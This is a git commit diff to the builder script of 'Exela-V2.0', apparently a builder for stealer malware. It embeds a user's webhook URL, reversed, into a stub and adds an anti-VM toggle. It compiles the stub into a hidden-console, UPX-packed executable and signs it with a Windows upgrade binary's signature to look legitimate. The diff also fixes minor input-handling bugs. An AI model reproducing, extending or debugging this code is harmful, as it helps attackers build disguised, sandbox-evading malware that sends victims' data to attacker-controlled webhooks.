8870eeaafe24ccd2349dee15a443b703cdd768d5
quicaxd <127431653+quicaxd@users.noreply.github.com>
2023-07-25 15:18:01 +0300

    Update builder.py

--- Exela-V2.0/builder.py
+++ Exela-V2.0/builder.py
@@ -4,6 +4,7 @@ class Build:
     def __init__(self) -> None:
         self.pyinstallerCommand = "pyinstaller --onefile --noconsole --clean --upx-dir upx-4.0.2-win64 "
         self.useIcon = False
+        self.antivmorospusu = "true"
         self.compileToExe()
     def compileToExe(self):
         try:
@@ -11,22 +12,28 @@ class Build:
             os.system("cls")
             getWebhook = str(input('Enter Your webhook URL : '))
             time.sleep(0.5)
+            getAntiVmReq = str(input('Yes/no\nDo you want to use Anti-VM : '))
+            if getAntiVmReq.lower() == "n" or getAntiVmReq.lower() == "no":
+                self.antivmorospusu = "false"
+            else:
+                self.antivmorospusu = "true"
             getIcon = str(input("Yes/no\nDo you want to change the icon of the file : "))
             iconPath = None
-            if getIcon.lower == "yes" or getIcon.lower() == "y":
+            if getIcon.lower() == "yes" or getIcon.lower() == "y":
                 self.useIcon = True
-                getIconPath = str("icon file must be .ico otherwise the icon will not change\nEnter the path of the icon file : ")
+                getIconPath = input(str("icon file must be .ico otherwise the icon will not change\nEnter the path of the icon file : "))
                 if not getIconPath.endswith(".ico"):
                     print("invalid icon\nIcon change has been disabled.")
                     self.useIcon = False
                 else:
                     iconPath == getIconPath
             if self.useIcon == True:
-                self.pyinstallerCommand += f"--icon={iconPath} stub.py"
+                self.pyinstallerCommand += f"--icon={getIconPath} stub.py"
             else:self.pyinstallerCommand += "stub.py"
             with open("Exela.py", "r", encoding="utf-8", errors="ignore") as f:
                 readedCode = f.read()
-            replacedCode = readedCode.replace("%REPLACE_ME_FOR_QUiCADXD%", getWebhook[::-1])
+            replacedCode = readedCode.replace("%REPLACE_ME_FOR_QUiCADXD%", getWebhook[::-1]).replace('%AnTiVm%', self.antivmorospusu)
+            
             with open("stub.py", "w", encoding="utf-8", errors="ignore") as x:
                 x.write(replacedCode)
             os.system(self.pyinstallerCommand)
@@ -40,17 +47,18 @@ class Build:
             print("Your File compiled was succesfully")
             time.sleep(1)
             self.singFile("Windows10Upgrade9252.exe", os.getcwd() + "\\dist\\stub.exe", "Exela.exe")
-            self.clearJunkFiles()
+            
     def moduleInstaller(self):
         try:
             os.system('cls')
-            os.system("pip install psutil")
-            os.system("pip install wmi")
-            os.system("pip install pycryptodome")
-            os.system("pip install pypiwin32")
-            os.system("pip install dhooks")
-            os.system("pip install requests")
-            os.system("pip install uuid")
+            #os.system("pip install psutil")
+            #os.system("pip install wmi")
+            #os.system("pip install mss")
+            #os.system("pip install pycryptodome")
+            #os.system("pip install pypiwin32")
+            #os.system("pip install dhooks")
+            #os.system("pip install requests")
+            #os.system("pip install uuid")
             os.system("pip install pyinstaller")
         except:
             os.system('cls')
@@ -72,10 +80,11 @@ class Build:
         except:
             os.system("cls")
             print("An error occurred while signing your file with a digital signature, please use the stub.exe file in the dist/stub.exe folder")
+            #self.clearJunkFiles()
         else:
             os.system('cls')
             print(f"Your File signed Succesffuly, your file is => {outputFile}")
-
+            #self.clearJunkFiles()
     def clearJunkFiles(self):
         try:
             os.remove('stub.py')
